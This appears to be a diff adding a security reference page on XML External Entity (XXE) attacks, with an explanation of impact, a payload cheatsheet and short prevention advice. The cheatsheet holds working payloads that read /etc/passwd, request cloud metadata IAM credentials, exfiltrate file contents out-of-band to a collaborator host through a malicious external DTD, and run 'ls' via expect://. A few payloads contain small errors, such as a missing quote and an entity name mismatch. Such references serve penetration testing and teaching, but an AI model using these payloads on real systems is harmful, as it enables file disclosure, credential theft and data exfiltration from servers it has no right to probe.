@@ -1,0 +1,76 @@
+What's XXE?
+
+An XML External Entity vulnerability is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This can lead to the disclosure of confidential data, denial of service, server-side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.
+
+In some situations, XXE can be leveraged to perform server-side request forgery (SSRF) attacks to compromise the underlying server or other back-end infrastructure.
+
+There are different types of XXE attacks such as:
+
+    Exploiting XXE to retrieve files
+    Exploiting XXE to perform SSRF attacks
+    Exploiting BLIND XXE exfiltrate data out-of-band
+    Exploiting BLIND XXE to retrieve data via error messages
+
+What's the impact of XXE?
+
+Attacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier. Since the attack occurs based on the application processing the XML document, an attacker may use this trusted application to pivot to other internal systems. In some situations, a XML processor library that is vulnerable to client-side memory corruption issues may be exploited by dereferencing a malicious URI, possibly allowing arbitrary code execution under the application account. Other attacks can access local resources that may not stop returning data, possibly impacting application availability if too many threads or processes are not released.
+
+Cheatsheet
+
+  --------------------------------------------------------------------
+using external entities:
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+--------------------------------------------------------------------
+perform SSRF attacks:
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+--------------------------------------------------------------------
+Blind XXE with out-of-band interaction:
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://burp-collab"> ]>
+--------------------------------------------------------------------
+Blind XXE with out-of-band interaction via XML parameter entities:
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://burp-collaborator> %xxe; ]>
+--------------------------------------------------------------------
+blind XXE to exfiltrate data using a malicious external DTD:
+DTD file:
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; test SYSTEM 'http://burp-collaborator/?a=%file;'>">
+%eval;
+%test;
+XXE Payload:
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+-------------------------------------------------------------------
+blind XXE to retrieve data via error messages:
+DTD file:
+<!ENTITY % passwd SYSTEM "file:///etc/passwd">
+<!ENTITY % notvalid "<!ENTITY &#x25; test SYSTEM 'file:///invalid/%file;'>">
+%notvalid;
+%test;
+XXE Payload:
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+-------------------------------------------------------------------
+XInclude to retrieve files:
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+-------------------------------------------------------------------
+XXE via image file upload:
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+--------------------------------------------------------------------
+XXE inside SOAP body:
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
+-------------------------------------------------------------------
+XXE: Base64 Encoded:
+<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
+-------------------------------------------------------------------
+XXE inside SVG:
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+    <image xlink:href="expect://ls"></image>
+</svg>
+--------------------------------------------------------------------
+
+How to prevent it?
+
+Because user supplied XML input comes from an “untrusted source” it is very difficult to properly validate the XML document in a manner to prevent this type of attack.
+
+Instead, the XML processor should be configured to use only locally defined Document Type Definition (DTD) and disallow any inline DTD that is specified within user supplied XML documents.
+
+Due to the fact that there are numerous XML parsing engines available for different programming languages, each has its own mechanism for disabling inline DTD to prevent XXE. You may need to search your XML parser’s documentation for how to disable inline DTD specifically.
+
